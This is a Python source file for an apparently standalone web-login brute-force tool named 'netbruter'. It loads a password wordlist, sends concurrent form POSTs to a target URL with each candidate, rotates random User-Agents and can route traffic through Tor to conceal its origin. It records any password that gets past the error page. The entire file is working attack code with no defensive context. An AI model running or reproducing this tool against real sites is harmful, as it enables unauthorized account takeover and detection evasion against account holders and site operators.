#!/usr/bin/env python3.6
import asyncio
import async_timeout
import aiohttp
import sys
import random
import os

from netbruter.arguments import argument_parsing
from netbruter.tor import get_tor_connector, parse_proxy_address
from netbruter.user_agent import get_user_agents
from copy import copy

try:
    from asyncio import JoinableQueue as Queue
except ImportError:
    from asyncio import Queue
    from asyncio import Event


class Netbrute:
    """
    Main program class
    """
    def __init__(self, aiohttp_session, target_url, payload_model, wordlist, error_string, tor=None, tor_address=None,
                 debug=None):
        self.queue = Queue()
        self.attack_url = target_url
        self.error_string = error_string
        self.payload = self._generate_payload_type(payload_model)
        self.session = aiohttp_session
        self.wordlist = wordlist
        self.found = Event()
        self.tor_use = tor
        self.debug = debug
        self.runned_passwords = set()
        self.old_passwds = set()
        self.restore_files = []

        # Statuses set of settings
        self.loaded_passwords = None
        self.tried_passwords = 0
        self.error_passwords = 0

        # Tor set of settings
        if self.tor_use is not None and tor_address is not None:
            ip, port = parse_proxy_address(tor_address)
            self.tor_address = "http://{0}:{1}".format(ip, port)

        # Session set of settings
        if self._search_open_sesssion() > 0:
            for file in self.restore_files:
                if self._load_old_session(file) is True:
                    break
        else:
            self.session_name = self._generate_session_name()

    def _load_old_session(self, fn):
        question = input("[*] Do you want to load passwords from file '{0}'? [y/N]".format(os.path.basename(fn)))
        if question.upper() == "Y":
            with open(fn, "r") as f:
                for line in f.readlines():
                    line = line.replace("\n", "")
                    self.old_passwds.add(line)
            self.session_name = os.path.basename(fn)
            return True
        else:
            return False

    def _search_open_sesssion(self):
        current_dir = os.getcwd() + os.sep
        for root, dirc, files in os.walk(current_dir):
            for f in files:
                if f.endswith(".restore"):
                    file_path = os.path.join(root, f)
                    self.restore_files.append(file_path)
        return len(self.restore_files)

    @staticmethod
    def _generate_session_name():
        _id = hex(random.randint(0, 999999))
        return "session_{0}.restore".format(_id[2:])

    @staticmethod
    def _generate_payload_type(user_input):
        """
        Function responsible for transforming String type into Dictionary type
        :param user_input: str
        :return: d: dict
        """
        d = dict()
        p = [x.strip() for x in user_input.split(",")]
        for element in p:
            key, value = element.split(":")
            d[key] = value
        return d

    @staticmethod
    def _encode_payload_www(unencoded_payload):
        """
        Function responsible for transforming a dictionary payload into x-www-form-urlencoded payload
        :param unencoded_payload:
        :return:
        """
        pl = str()
        dict_len = len(unencoded_payload)
        i = 1
        for key in unencoded_payload:
            if i != dict_len:
                pl += "{0}={1}&".format(key, unencoded_payload[key])
            else:
                pl += "{0}={1}".format(key, unencoded_payload[key])
            i += 1
        return pl

    def _adjust_payload(self, password):
        tmp_payload = copy(self.payload)
        for key in tmp_payload:
            value = tmp_payload[key]
            if value.upper() == "PASS":
                tmp_payload[key] = password
        return tmp_payload

    @staticmethod
    def _store_data(fn, data):
        data += "\n"
        with open(fn, "a") as f:
            f.write(data)
        return

    def _report_status(self):
        prctg = "%15.2f%%" % (self.tried_passwords / float(self.loaded_passwords))
        sys.stdout.write("\rPROGRESS: {0}".format(prctg))
        sys.stdout.flush()

    def _parse_response(self, status, response_url, passwd):
        if status == 200 and self.error_string in response_url:
            self.tried_passwords += 1
            self.runned_passwords.add(passwd)
            if len(self.runned_passwords) % 100 == 0:
                [self._store_data(self.session_name, x) for x in self.runned_passwords]
                self.runned_passwords.clear()
        elif status == 200 and self.error_string not in response_url:
            print("[+] Password was found: {0}".format(passwd))
            self._store_data("correct.pass", passwd)
            self.found.set()
        elif status != 200:
            self.error_passwords += 1
            print("[!] Incompatible status code: {0} | URL: {1}".format(status, response_url))
        return

    async def attack_this(self, password):
        if self.debug:
            print("Started attack!")
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "User-Agent": random.choice(ua),
        }
        custom_payload = self._adjust_payload(password)
        with async_timeout.timeout(10):
            if self.tor_use is True:
                proxy_addr = self.tor_address
            else:
                proxy_addr = None
            async with self.session.post(self.attack_url, data=self._encode_payload_www(custom_payload),
                                         headers=headers, proxy=proxy_addr) as response:

                body, status, response_url = await response.text(), response.status, response.url
                self._parse_response(status, response_url, password)

                if not self.debug and self.tried_passwords % 100 == 0:
                    self._report_status()

                if self.debug:
                    print("Ended attack! [{0}] - Status: {1} - URL: {2}".format(password, status, response_url))
                return

    def _parse_wordlist(self, iterable):
        return list(filter(lambda x: x not in self.old_passwds, iterable))

    def _read_wordlist(self):
        tmp_list = []
        with open(self.wordlist, "r") as f:
            for line in f.readlines():
                tmp_list.append(line.replace("\n", ""))
        parsed_list = self._parse_wordlist(tmp_list)
        for element in parsed_list:
            self.queue.put_nowait(element)
        self.loaded_passwords = len(parsed_list)
        return len(parsed_list)

    @asyncio.coroutine
    def work(self):
        while not self.queue.empty() or self.found.is_set():
            password = yield from self.queue.get()
            yield from self.attack_this(password)
            self.queue.task_done()

    @asyncio.coroutine
    def initiate(self):
        if self.debug:
            print("Started initiation!")
        pass_number = self._read_wordlist()
        print("Program have read {0} passwords.".format(pass_number))
        workers = [asyncio.Task(self.work()) for _ in range(10)]
        yield from self.queue.join()
        for w in workers:
            w.cancel()
        if self.debug:
            print("Ended initiation!")


if __name__ == "__main__":

    #  Load user agents
    ua = get_user_agents()
    if not ua:
        print("[!] Could not get any valid user agent")
        sys.exit(-1)

    #  asyncio loop
    loop = asyncio.get_event_loop()
    args = argument_parsing()

    #  Check arguments
    if not args:
        sys.exit(0)

    if args.tor:
        print("[+] Using tor with address {0}".format(args.tor_address))
        conn = get_tor_connector(args.tor_address)
        session = aiohttp.ClientSession(loop=loop, connector=conn)
    else:
        session = aiohttp.ClientSession(loop=loop)

    net = Netbrute(session, args.url, args.payload, args.wordlist, args.error_string,
                   tor=args.tor, tor_address=args.tor_address, debug=args.debug)
    loop.run_until_complete(net.initiate())
